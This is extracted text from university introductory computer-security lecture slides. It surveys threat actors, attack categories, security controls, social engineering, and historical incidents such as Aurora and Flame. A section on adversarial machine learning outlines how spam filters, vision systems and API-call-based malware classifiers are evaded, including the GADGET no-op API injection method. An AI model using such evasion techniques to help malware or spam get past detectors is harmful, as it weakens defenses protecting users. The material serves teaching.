– eavesdropping/monitoring transmissions
– difficult to detect
– emphasis is on prevention rather than detection
– two types:
• release of message contents
• traffic analysis
• Active attacks involve modification of the data stream
– goal is to detect them and then recover
– four categories:
• masquerade
• replay
• modification of messages
• denial of service
92
Who are the bad guys?
• Elite hackers
• Virus writers and releasers
• Script kiddies: limited but numerous
• Criminals - growing rapidly
• Employees, Consultants, and Contractors
– White hats: use their hacking ability for defensive purpose
– Ethical hacker: former black hat, white hat, consulting 
company; using his skills for defensive purposes
• Cyberterrorism and Cyberwar
• Hacktivism: hacking for a cause (e.g., social or political 
agenda)
• Virtual gangs: a group of hackers that each one of them 
specializes in different platform
93
Goals of information security
• Identification of the organization’s assets
• Making sure that important assets 
(data\information, hardware, software, 
network) of the organization are protected
• Allowing the organization to run its business 
with as less disruptions as possible
• Continuous and iterative activity of integrating, 
implementing, improving and validating security 
mechanisms to allow running business process
• Complying with information security policies, 
rules, regulations
94
Computer security strategy – how 
do we get it done?
• Specification/policy
– what is the security scheme supposed to do?
– consider the value of the assets; vulnerabilities; 
potential threats and the likelihood of attacks
– “Ease of use versus security”
– “Cost of security versus cost of failure and recovery”
• Risk management
• Implementation/mechanisms
– how does it do it?
– prevention, detection, response, recovery
• Correctness/assurance
– does it really work?
– assurance, evaluation
95
Security plan elements
• Governance
• Policy
• Asset identification & 
classification
• Risk management 
program
• Intelligence program
• Audit & compliance 
program
• Incident management
• Education & awareness 
program
• Technical security 
(systems, 
communication)
• Access control
• Identification and 
Authentication
• Configuration 
management
• Contingency planning
• Monitoring
• Physical security
• Employees/personnel
• Forensics
96
ניהול אבטחת מידע–7799י "ת
קביעת מדיניות אבטחת מידע. 1•
ארגון אבטחת מידע. 2•
סיווג ובקרה של נכסי הארגון. 3•
אבטחת עובדים. 4•
אבטחה פיזית וסביבתית. 5•
ותפעולתקשורת ניהול . 6•
בקרת גישה. 7•
ותחזוקה של מערכותפיתוח . 8•
המשכיות עסקיתניהול . 9•
תאימות.10•
97
Security technologies used
• Implementing 
mature, low cost
solutions
98
Key drivers
• Client requirement
• Legal, regulations
• Potential exposure
• Common practice
• Security vs. privacy
• Budget
• Transparency
99
Who is responsible for security
• Executive management\CEO ?
• IT department\CTO ?
• IT security stuff ?
Everyone! – all employees and stakeholders of 
the organization
100
Who is responsible for security
101
IT department 
and CTO
Security 
function in the 
IT department
Independent 
unit reporting 
to the 
management 
managed by the 
CISO
Role of security in today’s world
• Top management
– Endorse and lead information security
• Chief Information Security Officer (CISO)
– Responsible for the design and implementation of a 
comprehensive security plan
• Information security implementer
– Implement, install, support , maintain security tools
– The “hands-on” function
– Sometime the network administrator is also the IS 
implementer
– Deep understanding in Windows, Linux, databases, network 
security and also in specific products (Symantec, Cisco …)
102
Role of security in today’s world
• Information security architect\engineer
– Design the security solution that should protect the 
organization against its risks
– Instruct the IS implementers
• Information security auditor
– Auditing of security products, processes, policies etc.
• Penetration tester\Ethical Hacker
– Hacking to systems and assets
– Detecting vulnerabilities
• Forensics investigator
103
Designing a security system
• What goals do we want to achieve?
• Does the system focus on the data, operations 
or the users of the system?
• What level should the security system operate 
from? Should it be at the level of hardware, 
operating system or applications package?
• Should it be simple or sophisticated?
• In a distributed system, should the security be 
centralized or spread?
• How do you secure the levels below the level of 
the security system?
104
• Physical measures: CCTV, guard, fences, locks, CD-ROM\USB 
removal, fire alarms, controlling individual access to the 
facility…
• Administrative measures: developing and
publishing policies, standards, procedures
and guidelines, screening and background
checks, awareness, risk assessment, 
audit, training…
• Technical (logical) measures: access
control mechanisms to systems, passwords,
firewalls, anti-virus, IDS, VPNs, configuration 
managements, backup…
Types of security controls and 
solutions
Assets
Technical measures
Administrative
measures
Physical 
measures
105
Categories
Administrative Technical Physical
Directive Policy Warning/ 
instructive banner
Security guard
Deterrent Demotion Audit logs Security guard
Preventive Information 
classification
Encryption / 
access control
Fences
Detective Investigation IDS Motion detectors
Corrective Termination Anti-virus Fire extinguisher
Recovery DRP Backups Rebuild
Compensating Supervision Keystroke dynamic Layered fences
106
Security services
• Authentication
– assuring that a communication is from the source 
that it claims to be from
– must assure that the connection is not interfered 
with by a third party masquerading as one of the 
two legitimate parties
– Data origin authentication
• Access control
– the ability to limit and control the access to host 
systems and applications via communications links
107
Security services
• Nonrepudiation
– prevents either sender or receiver from 
denying a transmitted message
– receiver can prove that the alleged sender 
in fact sent the message
– the sender can prove that the alleged 
receiver in fact received the message
108
Security services
• Data confidentiality
– the protection of transmitted data from 
passive attacks
– protects the traffic flow from analysis
– this requires that an attacker not be able 
to observe the source and destination, 
frequency, length, or other characteristics 
of the traffic on a communications facility
109
Security services
• Data Integrity
– can apply to a stream of messages, a single 
message, or selected fields within a message
– protection against message modification only
– assures that messages are received as sent, 
with no duplication, insertion modification, 
reordering, or replays
– destruction of data is also covered under this 
service
• Availability
– a service that protects a system to ensure its 
availability
110
Assurance and Evaluation
• assurance
– the degree of confidence one has that the 
security measures work as intended to protect 
the system and the information it processes
– encompasses both system design and system 
implementation
• evaluation
– process of examining a computer product or 
system with respect to certain criteria
– involves testing and formal analytic or 
mathematical techniques
111
Social engineering
• Human are usually the weakest link in the 
security chain
• Social engineering is the human side of 
breaking into a corporate network
• Acquisition of sensitive information or 
inappropriate access privileges by an outsider 
based upon inappropriate trust relationships 
with insiders
• The goal is to cone the victim into providing 
valuable information
112
80%-95% of the attacks exploits 
human vulnerabilities
113BGU Cyber Security Research Center
Social engineering
• Human are usually the weakest link in the security chain
• Social engineering is the human side of breaking into a 
corporate network
• Acquisition of sensitive information or inappropriate 
access privileges by an outsider based upon inappropriate 
trust relationships with insiders
• The goal is to cone the victim
into providing valuable information
• Steps
– Information gathering
– Development of relationship
– Exploiting of relationship
– Execution to achieve objective
114
Social engineering - types
• Human-based - person-to-person interaction in order to 
retrieve the desired information
– Impersonation
– Posing as important user
– Third party authorization
– Masquerading
– Dumpster Diving (= Trashing) and shoulder surfing
• Computer-based
– Having computer software that attempts to retrieve desired 
information
– Mail or Instant Messaging (IM) attachments
– Pop up windows
– Websites
– Spam mail
– CD / DVD/ USB …
115
Checkpoint analysis of Gooligan: 1m Google accounts compromised 
(30/11/16)
• The malware code been found in
dozens of legitimate-looking apps
on third-party app stores which 
offer free versions of paid 
application
• Gooligan-infected apps are also 
installed using phishing scams
• After Gooligan is installed  he collect 
data about the device and downloads 
a rootkit that takes advantage of
well-known Android 4 and 5 (old 
versions) exploits
• These exploits still plague many 
devices today because the patches 
were never installed by the user
BGU Cyber Security Research Center 116
Information security
An on going process
• Prevention
• Monitoring and detection
• Response
• Emergency – carry out BCP
• Recovery
• Forensics \ investigation
• Updating
117
Auditing,
Periodic testing
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מבוא\Introh\CompNetSec1.Introduction.pptx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security (372-1-460-1)

Introduction
Dept. of Software and Information Systems Engineering, Ben-Gurion University

Prof. Yuval Elovici, Dr. Asaf Shabtai, Dr. Mordechai Guri

Spring, 2019
1

2
Syllabus
When:
Monday 09:00 – 12:00
Monday 13:00 – 16:00
Tuesday 09:00 – 12:00

TA’s:
Ron Biton, Ben Nassi, Noam Moskovitch, Avihad Eliyashar, Vitaly Dyadyuk
Exam (70%) + 4 Exercises (30%) + Labs
Should submit 80% of the lab tasks

Reading materials: 
Network security: Kaufman/Perlman or Stallings
Web

3
Syllabus
Introduction to cyber security
Encryption
Access control
Intrusion detection/data leakage/ firewall
Malicious software
Internet security protocols
Attacks: buffer overflow, SQL injection, DoS
Network security
3

4
Syllabus
4

5
Course goals
Understanding threats to today’s computerized world
Introduction to standard and emerging security mechanisms
Setting a security state of mind
Hands on experience
5

6
Course positioning
6
Introduction to computer and network security
Cryptography
Information Security Management
Malware Internals
סוגיות מתקדמות בקוד עוין
Cyber Security Using Machine Learning
הנדסת אבטחת מערכות
Operating Systems Security
Network Security
Implementation Attacks
Advanced topics in security

7
Ethics
You will learn and practice attack techniques and approaches that can cause real damage


Do not ‘experiment’ without guidance
7

8
Computer & information security


What is computer/network/ information security?
8

9
Cyber security
Cyber security is defined as the intersection of
computer security
network security
information security
and…
	physical space
9

10

Estonia (Wikipedia): Cyberattacks on Estonia refers to a series of cyber attacks that began 27 April 2007 and swamped websites of Estonian organizations, including Estonian parliament, banks, ministries, newspapers and broadcasters, amid the country's row with Russia about the relocation of the Bronze Soldier of Tallinn, an elaborate Soviet-era grave marker, as well as war graves in Tallinn. Most of the attacks that had any influence on the general public were distributed denial of service type attacks ranging from single individuals using various methods like ping floods to expensive rentals of botnets usually used for spam distribution. Spamming of bigger news portals commentaries and defacements including that of the Estonian Reform Party website also occurred.

GHOSTNET (Wikipedia): the name given by researchers at the Information Warfare Monitor to a large-scale cyber spying operation discovered in March 2009. The operation is likely associated with an Advanced Persistent Threat. Its command and control infrastructure is based mainly in the People's Republic of China and has infiltrated high-value political, economic and media locations in 103 countries. Computer systems belonging to embassies, foreign ministries and other government offices, and the Dalai Lama's Tibetan exile centers in India, London and New York City were compromised. Although the activity is mostly based in China, there is no conclusive evidence that the Chinese government is involved in its operation.

Operation Aurora (Wikipedia): Operation Aurora was a cyber attack which began in mid-2009 and continued through December 2009. The attack was first publicly disclosed by Google on January 12, 2010, in a blog post. In the blog post, Google said the attack originated in China. The attacks were both sophisticated and well resourced and consistent with an advanced persistent threat attack.
 The attack has been aimed at dozens of other organizations, of which Adobe Systems, Juniper Networks and Rackspace have publicly confirmed that they were targeted. According to media reports, Yahoo, Symantec, Northrop Grumman, Morgan Stanley and Dow Chemical were also among the targets.  As a result of the attack, Google stated in its blog that it plans to operate a completely uncensored version of its search engine in China "within the law, if at all", and acknowledged that if this is not possible it may leave China and close its Chinese offices. Official Chinese media responded stating that the incident is part of a U.S. government conspiracy.
 The attack was named "Operation Aurora" by Dmitri Alperovitch, Vice President of Threat Research at cyber security company McAfee. Research by McAfee Labs discovered that “Aurora” was part of the file path on the attacker’s machine that was included in two of the malware binaries McAfee said were associated with the attack. "We believe the name was the internal name the attacker(s) gave to this operation," McAfee Chief Technology Officer George Kurtz said in a blog post.
 According to McAfee, the primary goal of the attack was to gain access to and potentially modify source code repositories at these high tech, security and defense contractor companies. “[The SCMs] were wide open,” says Alperovitch. “No one ever thought about securing them, yet these were the crown jewels of most of these companies in many ways — much more valuable than any financial or personally identifiable data that they may have and spend so much time and effort protecting.“

NASDAQ: NASDQ Web site was attacked DoS. Not the trading systems.

Sony: “The theft comes on top of the 77 million PlayStation accounts taken in a cyber attack.”
The names, addresses, emails, birth dates, phone numbers and other information for 24.6m PC games customers were stolen from its servers. 
Sony also said the financial records of users from an outdated 2007 database involving people outside the US may have been stolen, including 10,700 direct debit records of customers in Austria, Germany, the Netherlands and Spain.

Lockheed Martin: “Hackers reportedly exploited Lockheed's VPN access system, which allows employees to log in remotely by using their RSA SecurID hardware tokens. Attackers apparently possessed the seeds--factory-encoded random keys--used by at least some of Lockheed's SecurID hardware fobs, as well as serial numbers and the underlying algorithm used to secure the devices.
That suggests that whoever attacked Lockheed Martin may also have been behind the successful breach in March of EMC's RSA division, which manufactures SecurID. "Since then, there have been malware and phishing campaigns in the wild seeking specific data linking RSA tokens to the end user, leading us to believe that this attack was carried out by the original RSA attackers," Rick Moy, president and CEO of NSS Labs, said in a blog post. 

Banks: Denial of Service

FLAME: discovered in 2012 that attacks computers running the Microsoft Windows operating system. The program is being used for targeted cyber espionage in Middle Eastern countries. Its discovery was announced on 28 May 2012 by MAHER Center of Iranian National Computer Emergency Response Team (CERT), Kaspersky Lab and CrySyS Lab of the Budapest University of Technology and Economics. The last of these stated in its report that it "is certainly the most sophisticated malware we encountered during our practice; arguably, it is the most complex malware ever found."
Flame can spread to other systems over a local network (LAN) or via USB stick. It can record audio, screenshots, keyboard activity and network traffic. The program also records Skype conversations and can turn infected computers into Bluetooth beacons which attempt to download contact information from nearby Bluetooth-enabled devices. This data, along with locally stored documents, is sent on to one of several command and control servers that are scattered around the world. The program then awaits further instructions from these servers.
 According to estimates by Kaspersky in May 2012, Flame had initially infected approximately 1,000 machines, with victims including governmental organizations, educational institutions and private individuals. At that time 65% of the infections happened in Iran, Israel, Sudan, Syria, Lebanon, Saudi Arabia, and Egypt, with a "huge majority of targets" within Iran. Flame has also been reported in Europe and North America. Flame supports a "kill" command which wipes all traces of the malware from the computer. The initial infections of Flame stopped operating after its public exposure, and the "kill" command was sent.


9
Everything is connected…
10

11
Everything is connected…
11

12
Everything is connected…
Internet is global, open, everybody online…
Including the attackers!
Computers are unprotected, unmanaged
Insecure platforms (Windows, IE, pdf readers)
Naïve users
Many, untrusted clients and peers
Protocols designed for friendly/secure environment
Many threats / attacks…
12

13


12
13

14
What are the threats…

14

15

Estonia (Wikipedia): Cyberattacks on Estonia refers to a series of cyber attacks that began 27 April 2007 and swamped websites of Estonian organizations, including Estonian parliament, banks, ministries, newspapers and broadcasters, amid the country's row with Russia about the relocation of the Bronze Soldier of Tallinn, an elaborate Soviet-era grave marker, as well as war graves in Tallinn. Most of the attacks that had any influence on the general public were distributed denial of service type attacks ranging from single individuals using various methods like ping floods to expensive rentals of botnets usually used for spam distribution. Spamming of bigger news portals commentaries and defacements including that of the Estonian Reform Party website also occurred.

GHOSTNET (Wikipedia): the name given by researchers at the Information Warfare Monitor to a large-scale cyber spying operation discovered in March 2009. The operation is likely associated with an Advanced Persistent Threat. Its command and control infrastructure is based mainly in the People's Republic of China and has infiltrated high-value political, economic and media locations in 103 countries. Computer systems belonging to embassies, foreign ministries and other government offices, and the Dalai Lama's Tibetan exile centers in India, London and New York City were compromised. Although the activity is mostly based in China, there is no conclusive evidence that the Chinese government is involved in its operation.

Operation Aurora (Wikipedia): Operation Aurora was a cyber attack which began in mid-2009 and continued through December 2009. The attack was first publicly disclosed by Google on January 12, 2010, in a blog post. In the blog post, Google said the attack originated in China. The attacks were both sophisticated and well resourced and consistent with an advanced persistent threat attack.
 The attack has been aimed at dozens of other organizations, of which Adobe Systems, Juniper Networks and Rackspace have publicly confirmed that they were targeted. According to media reports, Yahoo, Symantec, Northrop Grumman, Morgan Stanley and Dow Chemical were also among the targets.  As a result of the attack, Google stated in its blog that it plans to operate a completely uncensored version of its search engine in China "within the law, if at all", and acknowledged that if this is not possible it may leave China and close its Chinese offices. Official Chinese media responded stating that the incident is part of a U.S. government conspiracy.
 The attack was named "Operation Aurora" by Dmitri Alperovitch, Vice President of Threat Research at cyber security company McAfee. Research by McAfee Labs discovered that “Aurora” was part of the file path on the attacker’s machine that was included in two of the malware binaries McAfee said were associated with the attack. "We believe the name was the internal name the attacker(s) gave to this operation," McAfee Chief Technology Officer George Kurtz said in a blog post.
 According to McAfee, the primary goal of the attack was to gain access to and potentially modify source code repositories at these high tech, security and defense contractor companies. “[The SCMs] were wide open,” says Alperovitch. “No one ever thought about securing them, yet these were the crown jewels of most of these companies in many ways — much more valuable than any financial or personally identifiable data that they may have and spend so much time and effort protecting.“

NASDAQ: NASDQ Web site was attacked DoS. Not the trading systems.

Sony: “The theft comes on top of the 77 million PlayStation accounts taken in a cyber attack.”
The names, addresses, emails, birth dates, phone numbers and other information for 24.6m PC games customers were stolen from its servers. 
Sony also said the financial records of users from an outdated 2007 database involving people outside the US may have been stolen, including 10,700 direct debit records of customers in Austria, Germany, the Netherlands and Spain.

Lockheed Martin: “Hackers reportedly exploited Lockheed's VPN access system, which allows employees to log in remotely by using their RSA SecurID hardware tokens. Attackers apparently possessed the seeds--factory-encoded random keys--used by at least some of Lockheed's SecurID hardware fobs, as well as serial numbers and the underlying algorithm used to secure the devices.
That suggests that whoever attacked Lockheed Martin may also have been behind the successful breach in March of EMC's RSA division, which manufactures SecurID. "Since then, there have been malware and phishing campaigns in the wild seeking specific data linking RSA tokens to the end user, leading us to believe that this attack was carried out by the original RSA attackers," Rick Moy, president and CEO of NSS Labs, said in a blog post. 

Banks: Denial of Service

FLAME: discovered in 2012 that attacks computers running the Microsoft Windows operating system. The program is being used for targeted cyber espionage in Middle Eastern countries. Its discovery was announced on 28 May 2012 by MAHER Center of Iranian National Computer Emergency Response Team (CERT), Kaspersky Lab and CrySyS Lab of the Budapest University of Technology and Economics. The last of these stated in its report that it "is certainly the most sophisticated malware we encountered during our practice; arguably, it is the most complex malware ever found."
Flame can spread to other systems over a local network (LAN) or via USB stick. It can record audio, screenshots, keyboard activity and network traffic. The program also records Skype conversations and can turn infected computers into Bluetooth beacons which attempt to download contact information from nearby Bluetooth-enabled devices. This data, along with locally stored documents, is sent on to one of several command and control servers that are scattered around the world. The program then awaits further instructions from these servers.
 According to estimates by Kaspersky in May 2012, Flame had initially infected approximately 1,000 machines, with victims including governmental organizations, educational institutions and private individuals. At that time 65% of the infections happened in Iran, Israel, Sudan, Syria, Lebanon, Saudi Arabia, and Egypt, with a "huge majority of targets" within Iran. Flame has also been reported in Europe and North America. Flame supports a "kill" command which wipes all traces of the malware from the computer. The initial infections of Flame stopped operating after its public exposure, and the "kill" command was sent.


14
Some more examples…
15

16
Cyber attacks and critical infrastructure
Government Operations
Emergency Systems
Gas & Oil
Water Supply Systems
Telecommunications
Electrical Energy
Transportation
Banking & Finance
			
			

Critical 
Infrastructures

17
Project ‘Aurora’ (2007)
17

18

 A U.S. Department of Homeland Security exercise codenamed 'Aurora‘
 Conducted in March 2007
 Researchers were able to cause a power generator to self-destruct remotely via a hack which changed the operating cycle of the generator
17
SCADA Networks
18

19
9-1-1 system DDoS blackout

19




20


Find the difference…
20
USAF RQ-170 

21
Find the difference…
21
United States F-22 vs. China J-20

22
Today’s battlefield
22


23
Advanced persistence threat (APT)
A cyber attack mounted by organizational teams (e.g., foreign government) that have deep resources, advanced penetration skills, specific target profiles (political or commercial) and are remarkably
persistent in their efforts
23

24
An Observation from the Bible
“if as one people speaking the same language they have begun to do this, then nothing they plan to do will be impossible for them" 
The fact that many computers are based on the same operating system allows the attackers to design successful attacks that can also propagate from one computer to another.

25


24
What’s wrong with that picture?
25

26
Evaluation Testbed (PoC)
BGU Cyber Security Research Center
16

27


26
Attacks on avionic systems – becoming a real threat…

28
Attacks on cars
28


29
Automobile Example
The Tesla Hack @ Black Hat 2016 & 2017
Keen Security Lab: turn on the brakes remotely and getting the doors and trunk to open and close while blinking the lights in time to music streamed from the car's radio on Tesla Model X. 
“the work was complex and not easily replicated” 
The Jeep Hack @ Black Hat 2015 & 2016
Remotely stop a car and disable its brake.
Plug into the car's electronic system to hijack its steering and brake systems
The TPMS “Hack”
Tire Pressure Monitoring System (TPMS) signal sent wirelessly
Easily eavesdropped, with unique identifier
29

30
Autonomous cars
30

31
Autonomous cars
31

32

32

33

33

34
Ransomware

34

35
Everything is smart
2/24/2019
35
http://files.meetup.com/20182446/IS_Overview.pdf

36
Internet of Things
36

37
Internet of Things
37

38
Our future bathroom?
2/24/2019
IoT Security Analytics; Yair Meidan
38
http://www.mako.co.il/nexter-news/Article-ed331e883b02651006.htm?sCh=3d385dd2dd5d4110&pId=1758979194_8168
Rug
Electrical measurements through feet
Toilet seat
Measurements of blood pressure and pulse
Mirror
Camera to scan for complexion changes, indicating of blood problems
Speakers in bathtub
Ultrasonic sound waves, for heart-echo and internal organs

39
Smart things?
39

40
Illustration - iRobot
40

41
Medical domain…
41

42
Smartphones
42

43
Some more examples…Data leakage
43

44
Sony attack, 2014
Obtained data included personal information about Sony employees, e-mails communication, salaries, copies of (previously) unreleased Sony films, and more
44

45
Ashley Madison, 2015

45

46
Hacking Team, 2015
46

47
T-Mobile US, 2015

47

48

48

49
Supply-chain attack
49

50
Supply-chain attack
"The National Institute of Standards and Technology ("NIST") has recently released a draft update to the Framework for Improving Critical Infrastructure Cybersecurity (also known as the Cybersecurity Framework). 
The updated framework provides new details on managing cyber supply chain risks, clarifies key terms, and introduces measurement methods for cybersecurity. In this regard, it aims to further develop NIST’s voluntary guidance to organizations on reducing cybersecurity risks. Several key changes to the Cybersecurity Framework are as follows:
Supply Chain Risk Management: the draft adds cyber supply chain risk management considerations throughout the Cybersecurity Framework, including a new section on “Buying Decisions” and a new category under the Cybersecurity Framework Core’s Identify function with five subcategories;”
50

51
After-market devices (WOOT 2018)
51

52
After-market devices
52

53
IoT Botnets
53

54

54



55
Bridging the air-gap
55

56
56

57
Adversarial learning
Due to the large increase in the use of AI methods, hackers concluded that they too should embrace AI
Today, hackers are using machine learning to find loopholes in other machine learning based systems
Fooling AI systems is not very hard as machine learning relies on past cases and assumes that future data shares its characteristics
Hackers abuse this assumption for example, by manipulating the input data

57

58
Academic research on AL
58

59



Spam detection system
Trained to look for incriminating content by analyzing the text of spam emails

To avoid detection, a spammer can obfuscate the content of an email by deliberately misspelling suspicious words

60

A spam detection system is trained to look for incriminating content by analyzing the text of spam emails. To avoid detection, a spammer can obfuscate the content of an email by deliberately misspelling suspicious words. To the machine, the modified email looks like a non-spam email.
Adversarial traffic signs
Robust Physical-World Attacks on Deep Learning Visual Classification
Use Deep Learning (CNN) for image recognition (traffic signs identification) by autonomous vehicles 

Adversarial AI can be also applied on machine vision systems

“Confused the computer vision system into thinking that a stop sign was a 45 mph sign, with just a few pieces of tape.”

61


Handwrite recognition system
If the presented check is examined by a handwriting recognition system, the amount is extracted correctly

However, by adding certain adversarial noise to the digit nine we can fool the system and make it think that it is the digit eight.

62



62

63
Generic Black-Box Attack Against API-Calls Based Malware Classifiers
Ishai Rosenberg, Yuval Elovici, 
Lior Rokach, Asaf Shabtai

63

64
Detecting malware by analyzing system calls
64
Many of the AI-based anti-viruses examine the sequence of system calls (extracted at runtime) to characterize an application’s behavior

The sequence consists of requests issued by an application towards the operating system

Sequences used as features
Classification based on extracted syscall n-grams
Markov model
ANN – RNNs [Pascanu et al., 2015]; RNN, LSTM, GRU and CNN [Athiwaratkun et al., 2017]; RNN, combining file access and API calls [Wang et al., 2016]; feed-forward DNN, combining static features and API calls [Huang et al., 2016]
…

65


64
Classifiers performance
65

66

 DNN - 2 fully connected hidden layers of 128 neurons, each with ReLU activation and dropout rate of 0.2.
 CNN - 1D ConvNet with 128 output filters, stride length of 1, 1D convolution window size of 3 and a ReLU activation, followed by a global max pooling 1D layer, followed by a fully connected layer of 128 neurons with ReLU activation and dropout rate of 0.2.
 RNN, LSTM, GRU, BRNN, BLSTM, Bidirectional GRU - a hidden layer of 128 units, with dropout rate of 0.2 for both inputs and recurrent states.
 Random Forest – 10 DTs, Gini as a picking criteria.
65
Attack effectiveness
66

67

The lower the attack effectiveness (previous slide) – the higher the attack overhead (need more iterations and API calls additions to achieve a working adversarial example).

66
GADGET: Generative Api aDversarial
Generic Example by Transferability framework
A framework demonstrating an attacker’s ability to create and end-to-end attack using the proposed method
no-op attack – adding API’s which have no effect on the code’s functionality; with valid parameters
Add the adversarial modifications as an input
The injected code would trace the APIs called so far and each injected API would also call the adversarial added API, if needed
67
Malware Binary, 
without GADGET
Malware Binary, with GADGET
Advantages:
Requires no access to the malware source code
Generic – fit every code

Disadvantages:
API call type-specific

68
Cyber crime
Any illegal act involving a computer its system or its applications

Computer used as a tool

Computerized device is used as a target

Computer that contain evidences of the crime

New type of crimes
Speed, anonymity, geographical, evidence can be hidden…
68

69
Computer & information security
What is computer/information security?

Computer/information security deals with the prevention and detection of unauthorised actions by users of a computer system
69

70

אבטחת המידע מנקודת ראות מעשית

69
False assumptions
the code is too complex

why would anyone want to hack me?
70

71
Computer & information security
Intrusion detection
Malware detection
Authentication/ verification
Database security
Data leakage detection
Fraud detection
SPAM/Phishing detection
Privacy
Social networks security
Web content filtering
Forensics
Security analytics
Malicious insider detection
Awareness
…
71

72

אבטחת המידע מנקודת ראות מעשית
71
Why is it so difficult ?
72

73


72
Why is it so difficult ?
Challenges
Deals with abstract threats which cannot be solved only by using mathematical models (encryption/access control)
Protect against whom? employees, business partners, hacker/attacker, customers…
Intentional vs. accidental
Complex systems
Emerging technologies (smart mobile devices, social networks, cloud)
Increasing amounts of data to process
Protecting data while at-rest, in-motion and in-use
Regulations
Competition
Management
73

74


73
Why is it so difficult ?
Challenges
Electronic traces everywhere  big data
Identity theft: rather easy (pressure, physical theft, man‐in‐the‐middle)
Eavesdropping
Social engineering
Manipulation (integrity attack)
Internet goes SCADA
Side channel attacks on credit cards, teller machines, printers, smart phones: 
Protecting Systems:
Business process risks (e.g. DDoS)
Business intelligence risks (competitor intrudes)
Privacy risks
Externality risks (outside of cyber, e.g. critical infrastructure)
74

75


74
Why is it so difficult ?
Challenges
Many types of threats
Wide selection of security 
tools and vendors (e.g., 
deployment)
Hard to prove the benefit
Must consider potential
attacks
Super users / admin
Requires regular monitoring
Too often an after-thought
75

76

שום דבר לא קבוע.
מספר הכלים להתמודדות עם המתקפות והאיומים גדל כל הזמן. חלקם של כלים אלו הם בעלי יכולות חופפות/ דומות/ זהות. ניהול של כל אלה ובחירה מתוך חלופות זה נושא אחר.
75

Security trends
76

77

In order to assess the relative severity of various threats and the relative importance
of various approaches to computer security, it is useful to look at the experience of
organizations. A useful view is provided by the CSI Computer Crime and Security
Survey for 2010/2011, conducted by the Computer Security Institute. The respondents
consisted of over 350 U.S.-based companies, nonprofit organizations, and
public sector organizations.

Figure 1.4 shows the types of attacks experienced by respondents in nine
major categories. 6 Most noteworthy is the large and growing prevalence of malicious
software (malware) attacks. It is also worth noting that most categories of
attack exhibit a somewhat downward trend. The CSI report speculates that this is
due in large part to improved security techniques by organizations.
76
And more…
Potential attacks on the security features must be considered (e.g., OpenSSL Heartbleed)
Physical and logical placement needs to be determined
Complex algorithms or protocols may be involved
Attackers only need to find a single weakness, the developer needs to find all weaknesses

77

78
77

Computer security is both fascinating and complex. Some of the reasons follow:

1. Computer security is not as simple as it might first appear to the novice. The requirements seem to be straightforward, but the mechanisms used to meet those requirements can be quite complex and subtle.
2. In developing a particular security mechanism or algorithm, one must always consider potential attacks (often unexpected) on those security features. 
3. Hence procedures used to provide particular services are often counterintuitive. 
4. Having designed various security mechanisms, it is necessary to decide where to use them.
5. Security mechanisms typically involve more than a particular algorithm or protocol, but also require participants to have secret information, leading to issues of creation, distribution, and protection of that secret information. 
6. Computer security is essentially a battle of wits between a perpetrator who tries to find holes and the designer or administrator who tries to close them. 
7. There is a natural tendency on the part of users and system managers to perceive little benefit from security investment until a security failure occurs.
8. Security requires regular monitoring, difficult in today's short-term environment.
9. Security is still too often an afterthought - incorporated after the design is complete.
10. Many users / security administrators view strong security as an impediment to efficient and user-friendly operation of an information system or use of information.
Security trends
78

79
Darknet services or, Malware as a Service

79

80

80

81
Computer & information security
What is computer/information security?

“Protection afforded to an automated information system in order to attain the applicable objectives of preserving the integrity, availability and confidentiality of information system resources (includes hardware, software, firmware, information/data, and telecommunications).”
[NIST95] The NIST Computer Security Handbook
81

82
The AIC triad
Each system\environment\organization can be characterized based on these three factors

Stocks Exchanges systems – will focus more 
on the availability of the systems
Systems holding medical or customer-related 
data – will focus more on confidentiality




But is it enough ?
fraud, accountability, authenticity, system does what it was planed\designed to do, privacy, non-repudiation
82

83


82
Concepts and relationships
83

84
Terminology
84

85
Security taxonomy
85

86
85

There is one generally agreed-upon approach used by the CERT and other organizations concerned with computer security, the computer and network security incident taxonomy. Figure 1.4 from the text depicts the overall scope of computer security using this taxonomy. At a top level of detail, an attacker, or group of attackers, achieves their objectives by performing attacks. An incident may be comprised of a single or multiple attacks, as illustrated by the return loop . The key elements are:
• Action: A step taken by a user or process in order to achieve a result
• Target: A computer or network logical entity or physical entity
• Event: An action directed at a target that is intended to result in a change of state, or status, of the target
• Tool: A means of exploiting a computer or network vulnerability
• Vulnerability: A weakness in a system allowing unauthorized action
• Unauthorized result: An unauthorized consequence of an event
• Attack: A series of steps taken by an attacker to achieve an unauthorized result
• Attacker: An individual who attempts one or more attacks in order to achieve an objective
• Objectives: The purpose or end goal of an incident
• Incident: a group of attacks that can be distinguished from other attacks because of the distinctiveness of the attackers, attacks, objectives, sites, and timing
Vulnerabilities, threats and attacks
categories of vulnerabilities
corrupted (loss of integrity)
leaky (loss of confidentiality)
unavailable or very slow (loss of availability)
threats
capable of exploiting vulnerabilities
represent potential security harm to an asset
attacks (threats carried out)
passive – does not affect system resources
active – attempt to alter system resources or affect their operation
insider – initiated by an entity inside the security parameter
outsider – initiated from outside the perimeter
86

87
86

In the context of security, our concern is with the vulnerabilities of system
resources. [NRC02] lists the following general categories of vulnerabilities of a
computer system or network asset:

• It can be corrupted , so that it does the wrong thing or gives wrong answers.
For example, stored data values may differ from what they should be because
they have been improperly modified.

• It can become leaky . For example, someone who should not have access to
some or all of the information available through the network obtains such
access.

• It can become unavailable or very slow. That is, using the system or network
becomes impossible or impractical.

These three general types of vulnerability correspond to the concepts of integrity,
confidentiality, and availability, enumerated earlier in this section.

Corresponding to the various types of vulnerabilities to a system resource are
threats that are capable of exploiting those vulnerabilities. A threat represents a
potential security harm to an asset. An attack is a threat that is carried out (threat
action) and, if successful, leads to an undesirable violation of security, or threat
consequence. The agent carrying out the attack is referred to as an attacker, or
threat agent . We can distinguish two types of attacks:

• Active attack: An attempt to alter system resources or affect their operation.

• Passive attack: An attempt to learn or make use of information from the
system that does not affect system resources.

We can also classify attacks based on the origin of the attack:

• Inside attack: Initiated by an entity inside the security perimeter (an “insider”).
The insider is authorized to access system resources but uses them in a way not
approved by those who granted the authorization.

• Outside attack: Initiated from outside the perimeter, by an unauthorized or
illegitimate user of the system (an “outsider”). On the Internet, potential
outside attackers range from amateur pranksters to organized criminals, international
terrorists, and hostile governments.
Threats and consequences
Eavesdropping
Traffic analysis
Masquerading / Spoofing / Identity theft - dark side economy
